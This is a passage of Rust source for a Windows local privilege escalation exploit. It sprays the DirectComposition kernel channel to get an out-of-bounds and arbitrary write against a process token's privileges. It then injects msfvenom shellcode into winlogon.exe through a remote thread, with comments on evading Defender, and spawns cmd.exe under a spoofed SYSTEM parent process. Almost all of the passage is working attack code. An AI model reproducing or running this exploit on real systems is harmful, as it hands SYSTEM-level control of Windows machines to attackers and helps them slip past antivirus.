        *((qwpmappedaddr + buffoffs + 0x44) as *mut u32) = 0xcafebabe;
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize as u32, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn oobwrite(win32imports: WIN32IMPORTS, tokenaddr: usize) -> Vec<usize> {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps2handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = FENGSHUI2NUMRES as usize;
    //let channelbuffsize = spraysize * 0x24;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    //std::thread::sleep(std::time::Duration::from_secs(1));
    //breakpoint();
    let mut success: usize = 0;
    //we're getting weird now >:]
    let mut oobwriters: Vec<usize> = vec![0; 0x10];
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x1 + i;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *(qwpmappedaddr as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + 0x8) as *mut u32) = 0x1;
        *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + 0x10) as *mut u32) = 0x7;
        *((qwpmappedaddr + 0x14) as *mut u32) = 0xb8;
        *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
        *((qwpmappedaddr + 0x1c) as *mut usize) = tokenaddr + TOKEN_PRIVILEGES_OFFSET;
        let ntstatus = processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
        if NT_SUCCESS(ntstatus) {
            oobwriters[success] = propertyid;
            success += 1;
        }
        if success == OOBNUMATTEMPTS {
            break;
        }
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    let ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
    oobwriters
}

unsafe fn arbitrarywrite(win32imports: WIN32IMPORTS) {
    let commandbuffsize: u32 = 0x48;
    let commandbuffsize2: u32 = 0x2c;
    let spraysize = (FENGSHUI3END - FENGSHUI3START) / 2;
    let spraysize2 = FENGSHUI2NUMRES;
    let channelbuffsize: u32 = spraysize * commandbuffsize;
    let channelbuffsize2: u32 = spraysize2 * commandbuffsize2;
    let hchannel: HANDLE = null_mut();
    let hchannel2: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr2: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    let gfs0pmappedaddr: RwLockReadGuard<usize> = FS0MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs0pmappedaddr;
    let gps0handle: RwLockReadGuard<usize> = FS0HANDLE.read().unwrap();
    //our needle could be in either one of these haystacks...
    //good thing we just need the one needle :P
    *((&hchannel as *const _) as *mut usize) = *gps0handle;
    *((&hchannel2 as *const _) as *mut usize) = *gps2handle;
    for i in (FENGSHUI3START as usize..FENGSHUI3END as usize).step_by(2) {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x1 + i;
        let buffindex: usize = (i - FENGSHUI3START as usize ) / 0x2;
        let buffoffs: usize = buffindex * 0x48; 
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr + buffoffs + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 0x8) as *mut u32) = 0x1;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + buffoffs + 0x10) as *mut u32) = 0x0;
        *((qwpmappedaddr + buffoffs + 0x14) as *mut u32) = 0x0;
        *((qwpmappedaddr + buffoffs + 0x18) as *mut u32) = 0x23;
        *((qwpmappedaddr + buffoffs + 0x1c) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr + buffoffs + 0x20) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr + buffoffs + 0x24) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr + buffoffs + 0x28) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 0x2c) as *mut u32) = 0x1;
        *((qwpmappedaddr + buffoffs + 0x30) as *mut u32) = 0x14;
        *((qwpmappedaddr + buffoffs + 0x34) as *mut u32) = 0x1;
        *((qwpmappedaddr + buffoffs + 0x38) as *mut u32) = 0x08;
        *((qwpmappedaddr + buffoffs + 0x3c) as *mut u32) = 0x23;
        *((qwpmappedaddr + buffoffs + 0x40) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr + buffoffs + 0x44) as *mut u32) = 0xffffffff;
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize as u32, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0, hsynchobj);
    //breakpoint();
    //our needle could be in either one of these haystacks...
    //good thing we just need the one needle :P
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
    }
    for i in 0..spraysize2 as usize {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x1 + i;
        let buffoffs: usize = i * 0x2c; 
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr2 + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr2 + buffoffs + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr2 + buffoffs + 0x8) as *mut u32) = 0x1;
        *((qwpmappedaddr2 + buffoffs + 0xc) as *mut u32) = 0x1c;
        *((qwpmappedaddr2 + buffoffs + 0x10) as *mut u32) = 0x0;
        *((qwpmappedaddr2 + buffoffs + 0x14) as *mut u32) = 0x0;
        *((qwpmappedaddr2 + buffoffs + 0x18) as *mut u32) = 0x45;
        *((qwpmappedaddr2 + buffoffs + 0x1c) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr2 + buffoffs + 0x20) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr2 + buffoffs + 0x24) as *mut u32) = 0xffffffff;
        *((qwpmappedaddr2 + buffoffs + 0x28) as *mut u32) = 0xffffffff;
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel2, channelbuffsize2 as u32, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel2, lpdwargs1, lpdwargs2, 0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
    }
}

unsafe fn cleanup(win32imports: WIN32IMPORTS, oobwriters: Vec<usize>) {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps2handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = FENGSHUI2NUMRES as usize;
    //let channelbuffsize = spraysize * 0x24;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    //std::thread::sleep(std::time::Duration::from_secs(1));
    //breakpoint();
    for i in 0..spraysize {
        let propertyid: usize = 0x1 + i;
        //due to heap randomization it's unlikely any candidates are adjacent
        //to another oob writer chunk (ie unlikely they're corrupted themselves)
        //so this should suffice to set memory back to a stable state
        //many such cases where lfh randomization is actually helpful...
        if oobwriters.contains(&propertyid) {
            let hresource: HANDLE = null_mut();
            *((&hresource as *const _) as *mut usize) = propertyid;
            *(qwpmappedaddr as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
            *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
            *((qwpmappedaddr + 0x8) as *mut u32) = 0x1;
            *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
            *((qwpmappedaddr + 0x10) as *mut u32) = 0x7;
            *((qwpmappedaddr + 0x14) as *mut u32) = 0xb8;
            *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
            *((qwpmappedaddr + 0x1c) as *mut u32) = 0x00000000;
            *((qwpmappedaddr + 0x20) as *mut u32) = 0x00000000;
            processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
        }
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    let ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn getpid() -> u32 {
    println!(">Finding winlogon");
    let mut procentry: PROCESSENTRY32W = std::mem::zeroed();
    procentry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    let mut thpid: u32= 0;
    if Process32FirstW(snapshot, &mut procentry) == TRUE {
        while Process32NextW(snapshot, &mut procentry) != FALSE {
            let procname: OsString = OsString::from_wide(&procentry.szExeFile);
            if procname.into_string().unwrap().contains("winlogon.exe") {
                println!("\tFound winlogon.exe PID {:#x}", procentry.th32ProcessID);
                thpid = procentry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    if thpid == 0 {
        println!("Hm, could not find winlogon.exe");
        exit(1);
    }
    thpid
}

unsafe fn winlogoninject() {
    //default msfvenom cmd.exe payload, defender alerts on this shellcode, just a placeholder
    let shellcode: &mut [u8; 275] = &mut [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
        0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
        0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
        0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
        0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
        0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
        0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
        0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
        0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65,
        0x78, 0x65, 0x00
    ];
    
    let thpid: u32 = getpid();
    println!(">Opening handle to winlogon");
    let hwinlogon = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        thpid
    );
    if hwinlogon.is_null() {
        let nterr = GetLastError();
        println!("Couldn't open winlogon.exe {:#x}", nterr);
        exit(1);
    }
    println!(">Allocating memory for shellcode");
    let shellbuf = VirtualAllocEx(
        hwinlogon,
        NULL,
        1024,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if shellbuf.is_null() {
        let nterr = GetLastError();
        println!("Couldn't allocate bytes {:#x}", nterr);
        exit(1);
    }
    println!(">Calling WriteProcessMemory");
    let mut byteswritten: usize = 0;
    let wres = WriteProcessMemory(
        hwinlogon,
        shellbuf,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut byteswritten
    );
    if wres == 0 {
        let nterr = GetLastError();
        println!("WriteProcessMemory failed {:#x}", nterr);
        exit(1);
    }
    //hopefully prevents defender from scanning new thread memory
    println!(">Calling CreateRemoteThread");
    let rthread = CreateRemoteThread(
        hwinlogon,
        NULL.cast(),
        0,
        Some(transmute(shellbuf)),
        NULL,
        0,
        NULL.cast()
    );
    std::thread::sleep(std::time::Duration::from_secs(1));
    if rthread == INVALID_HANDLE_VALUE {
        println!("CreateRemoteThread failed");
        exit(1);
    }
}

unsafe fn getservicehandle() -> u32 {
    let mut bytesneeded: DWORD = 0;
    let servicename = b"DcomLaunch\0";
    let mut procinfo = SERVICE_STATUS_PROCESS {
        dwServiceType: 0,
        dwCurrentState: 0,
        dwControlsAccepted: 0,
        dwWin32ExitCode: 0,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
        dwProcessId: 0,
        dwServiceFlags: 0
    };
    let lpprocinfo = (&procinfo as *const _) as *mut u8;
    //connect to scm
    let hscmanager = OpenSCManagerA(
        NULL as *const i8, NULL as *const i8, SC_MANAGER_CONNECT);
    if hscmanager.is_null() {
        let hres = GetLastError();
        println!("OpenSCManager failed: {:#x}", hres);
        //close handles
        CloseServiceHandle(hscmanager);
        return 0;
    }
    //open service
    let hrpcsvc = OpenServiceA(
        hscmanager, servicename.as_ptr() as *const i8, SERVICE_QUERY_STATUS);
    if hrpcsvc.is_null() {
        let hres = GetLastError();
        println!("OpenServiceA failed: {:#x}", hres);
        //close handles
        CloseServiceHandle(hscmanager);
        CloseServiceHandle(hrpcsvc);
        return 0;
    }
    //query process information
    let queryres = QueryServiceStatusEx(
        hrpcsvc, SC_STATUS_PROCESS_INFO, lpprocinfo, std::mem::size_of::<SERVICE_STATUS_PROCESS>() as u32, &mut bytesneeded);
    if queryres == FALSE {
        let hres = GetLastError();
        println!("QueryServiceStatusEx failed: {:#x}", hres);
        //close handles
        CloseServiceHandle(hscmanager);
        CloseServiceHandle(hrpcsvc);
        return 0;
    }
    //return pids
    procinfo.dwProcessId
}

unsafe fn processmagic(usesvchost: bool) {
    //open the service and query its PID
    println!(">Getting handle to DcomLaunch");
    let hpid: u32 = match usesvchost {
        true => getservicehandle(),
        false => getpid()
    };
    if hpid == 0 {
        println!("Failed to get DcomLaunch PID");
        exit(1);
    }
    //open handle to process
    let parenthandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, hpid);
    if parenthandle.is_null() {
        let hres = GetLastError();
        println!("OpenProcess failed: {:#x}", hres);
        exit(1);
    }
    RevertToSelf();
    //intialize attributes of new process
    println!(">Initializing ProcThreadAttributeList and updating parent");
    let mut listsize: usize = 0;
    //let mut proclist = Vec::with_capacity(1);
    InitializeProcThreadAttributeList(NULL as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0, &mut listsize);
    //proclist.reserve(listsize);
    let mut proclist: Box<[u8]> = vec![0; listsize].into_boxed_slice();
    let mut siex: STARTUPINFOEXW = std::mem::zeroed();
    siex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    //siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    //siex.StartupInfo.wShowWindow = 5;
    siex.lpAttributeList = proclist.as_mut_ptr().cast();
    let initlistres = InitializeProcThreadAttributeList(
        siex.lpAttributeList, 1, 0, &mut listsize);
    if initlistres == FALSE {
        println!("Failed to initialize ProcThreadAttributeList");
        exit(1);
    }
    //update attributes to set dcomlaunch/winlogon as the parent
    let updateres = UpdateProcThreadAttribute(
        siex.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        parenthandle,
        std::mem::size_of::<HANDLE>(),
        NULL,
        NULL as *mut usize);
    if  updateres == FALSE {
        println!("Failed to update ProcThreadAttribute");
        exit(1);
    }
    //initialize startup info struct
    let mut procinfo: PROCESS_INFORMATION = std::mem::zeroed();
    //create process
    println!(">Spawning new reparented process");
    let mut procname = to_wstring("C:\\Windows\\System32\\cmd.exe");
    //let mut procname = "C:\\Windows\\System32\\cmd.exe";
    //procname.reserve(500);
    let mut ta: SECURITY_ATTRIBUTES = std::mem::zeroed();
    let mut pa: SECURITY_ATTRIBUTES = std::mem::zeroed();
    ta.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    pa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    let createres = CreateProcessW(
        procname.as_mut_ptr(),
        null_mut(),
        &mut pa,
        &mut ta,
        TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        null_mut(),
        null_mut(),
        &mut siex.StartupInfo,
        &mut procinfo);
    if createres == FALSE {
        let res = GetLastError();
        println!("CreateProcess failed: {:#x}", res);
    }
    else {
        println!("Created new process: {:#x}", procinfo.dwProcessId);
    }
    //CloseHandle(procinfo.hProcess);
    //CloseHandle(procinfo.hThread);
    //close the handle now that we don't need it
}

fn to_wstring(value: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;

    std::ffi::OsStr::new(value)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}
